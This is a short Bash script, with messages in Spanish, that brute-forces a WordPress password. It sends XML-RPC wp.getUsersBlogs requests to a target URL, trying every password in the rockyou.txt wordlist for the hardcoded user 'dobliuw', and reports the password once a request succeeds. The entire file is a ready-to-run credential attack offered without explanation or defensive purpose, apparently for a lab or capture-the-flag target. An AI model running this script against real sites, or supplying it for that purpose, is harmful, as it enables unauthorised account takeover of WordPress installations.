#!/bin/bash 

function help(){
	echo -e "\n[!] Usage $0 {target_url}\n"
	tput cnorm; exit 1   
}


# Ctrl + c 

function  ctrl_c(){
	/usr/bin/rm tempFile.xml 
	echo -e "\n\n\t[!] Saliendo...\n\n"
	tput cnorm; exit 1 
}

trap ctrl_c SIGINT

# Main 

tput civis 


function createXML(){
	url=$1 
	password=$2
	
	xmlFile="""
	<?xml version=\"1.0\" encoding=\"UTF-8\"?>
	<methodCall> 
	<methodName>wp.getUsersBlogs</methodName> 
	<params> 
	<param><value>dobliuw</value></param> 
	<param><value>$password</value></param> 
	</params> 
	</methodCall>"""

	echo $xmlFile > tempFile.xml 

	response=$(/usr/bin/curl -s -X POST $url -d@tempFile.xml)

	if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then 
		echo -e "\n\n\t[!] La contraseña del usuario dobliuw es $password\n\n"
		tput cnorm; exit 0 
	fi


}


function brute_force(){
  url=$1 
  cat /usr/share/wordlists/rockyou.txt | while read password; do 
	  createXML $url $password 
  done 
  /usr/bin/rm tempFile.xml 
}


function main(){
	url=$1
	if [ ! $url ]; then 
		help
	else 
		brute_force $url 
	fi 
}

main $1 


